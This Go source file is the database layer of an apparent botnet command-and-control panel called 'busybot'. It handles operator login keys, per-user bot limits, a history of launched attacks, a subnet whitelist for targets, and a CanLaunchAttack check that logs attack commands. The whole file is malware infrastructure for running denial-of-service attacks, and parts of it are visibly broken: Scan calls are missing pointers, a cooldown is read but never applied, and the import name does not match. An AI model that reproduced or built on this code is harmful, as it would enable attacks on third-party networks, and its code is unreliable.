package database

import (
    "os"
    "fmt"
    "net"
    "database/sql"
    "encoding/binary"
    _ "github.com/go-sql-driver/mysql"

    "busybot/core/handler"
)

type Database struct {
    db       *sql.DB
}

func netshift(prefix uint32, netmask uint8) uint32 {
        return uint32(prefix >> (32 - netmask))
}

func checkErr(err error) bool {
    if err != nil {
        fmt.Println(err)
        return true
    }
    return false
}

func checkCount(rows *sql.Rows) (count int) {
    for rows.Next() {
       err := rows.Scan(&count)
       checkErr(err)
   }
   return count
}

func NewDatabase(dbAddr string, dbUser string, dbPassword string, dbName string) *Database {
    db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s)/%s", dbUser, dbPassword, dbAddr, dbName))
    if err != nil {
        fmt.Println(err)
        os.Exit(0)
    }
    return &Database{db}
}

func (this *Database) TryLogin(key string) (bool) {
    rows, err := this.db.Query("SELECT admin FROM users WHERE key = ? ", key)
    if checkErr(err) {
        return false
    }
    defer rows.Close()
    if !rows.Next() {
        return false
    }
    return true
}

func (this *Database) IsAdmin(key string) (bool) {
    rows, err := this.db.Query("SELECT admin FROM users WHERE key = ? ", key)
    if checkErr(err) {
        return false
    }
    defer rows.Close()

    var admin int
    rows.Scan(admin)
    if (admin == 1) {
        return true
    } else {
        return false
    }
    return false
}

func (this *Database) GetBots(key string) (int) {
    rows, err := this.db.Query("SELECT max_bots FROM users WHERE key = ? ", key)
    if checkErr(err) {
        return 0
    }
    defer rows.Close()

    var max int
    rows.Scan(max)
    return max
}

func (this *Database) ongoingIds() int{
    var count int
    row := this.db.QueryRow("SELECT id FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    checkErr(err)
    return count
}

func (this *Database) ongoingCommands() string{
    var command string
    row := this.db.QueryRow("SELECT command FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&command)
    checkErr(err)
    return command
}

func (this *Database) ongoingDuration() int{
    var count int
    row := this.db.QueryRow("SELECT duration FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    checkErr(err)
    return count
}

func (this *Database) ongoingBots() int{
    var count int
    row := this.db.QueryRow("SELECT max_bots FROM `history` WHERE `duration` + `time_sent` > UNIX_TIMESTAMP()")
    err := row.Scan(&count)
    checkErr(err)
    return count
}

func (this *Database) ContainsWhitelistedTargets(attack *handle.Attack) bool {
        rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
        if err != nil {
                fmt.Println(err)
                return false
        }
        defer rows.Close()
        for rows.Next() {
                var prefix string
                var netmask uint8
                rows.Scan(&prefix, &netmask)

                // Parse prefix
                ip := net.ParseIP(prefix)
                ip = ip[12:]
                iWhitelistPrefix := binary.BigEndian.Uint32(ip)

                for aPNetworkOrder, aN := range attack.Targets {
                        rvBuf := make([]byte, 4)
                        binary.BigEndian.PutUint32(rvBuf, aPNetworkOrder)
                        iAttackPrefix := binary.BigEndian.Uint32(rvBuf)
                        if aN > netmask { // Whitelist is less specific than attack target
                                if netshift(iWhitelistPrefix, netmask) == netshift(iAttackPrefix, netmask) {
                                        return true
                                }
                        } else if aN < netmask { // Attack target is less specific than whitelist
                                if (iAttackPrefix >> aN) == (iWhitelistPrefix >> aN) {
                                        return true
                                }
                        } else { // Both target and whitelist have same prefix
                                if iWhitelistPrefix == iAttackPrefix {
                                        return true
                                }
                        }
                }
        }
        return false
}

func (this *Database) CanLaunchAttack(key string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool) {
        rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE key = ?", key)
        defer rows.Close()
        if err != nil {
                fmt.Println(err)
        }
        var userId, durationLimit, cooldown uint32
        if !rows.Next() {
                return false
        }
        rows.Scan(&userId, &durationLimit, &cooldown)

        if durationLimit != 0 && duration > durationLimit {
                return false
        }
        rows.Close()

        this.db.Exec("INSERT INTO history (user_id, time_sent, duration, command, max_bots) VALUES (?, UNIX_TIMESTAMP(), ?, ?, ?)", userId, duration, fullCommand, maxBots)
        return true
}
